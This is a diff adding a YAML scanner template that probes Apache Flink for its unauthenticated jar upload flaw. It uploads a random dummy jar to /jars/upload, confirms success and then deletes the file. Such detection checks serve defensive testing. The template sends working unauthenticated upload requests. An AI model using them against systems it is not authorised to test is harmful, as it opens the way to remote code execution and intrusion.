@@ -1,0 +1,38 @@
+name: poc-yaml-apache-flink-upload-rce
+set:
+    r1: randomLowercase(8)
+    r2: randomLowercase(4)
+rules:
+    - method: GET
+      path: /jars
+      follow_redirects: true
+      expression: >
+        response.status == 200 && response.content_type.contains("json") &&
+        response.body.bcontains(b"address") && response.body.bcontains(b"files")
+    - method: POST
+      path: /jars/upload
+      headers:
+          Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+      body: |-
+        --8ce4b16b22b58894aa86c421e8759df3
+        Content-Disposition: form-data; name="jarfile";filename="{{r2}}.jar"
+        Content-Type:application/octet-stream
+
+        {{r1}}
+        --8ce4b16b22b58894aa86c421e8759df3--
+
+      follow_redirects: true
+      expression: >
+        response.status == 200 && response.content_type.contains("json") &&
+        response.body.bcontains(b"success") && response.body.bcontains(bytes(r2))
+      search: >-
+        (?P<filen>([a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}_[a-z]{4}.jar))
+    - method: DELETE
+      path: '/jars/{{filen}}'
+      follow_redirects: true
+      expression: |
+        response.status == 200
+detail:
+    author: timwhite
+    links:
+        - https://github.com/LandGrey/flink-unauth-rce
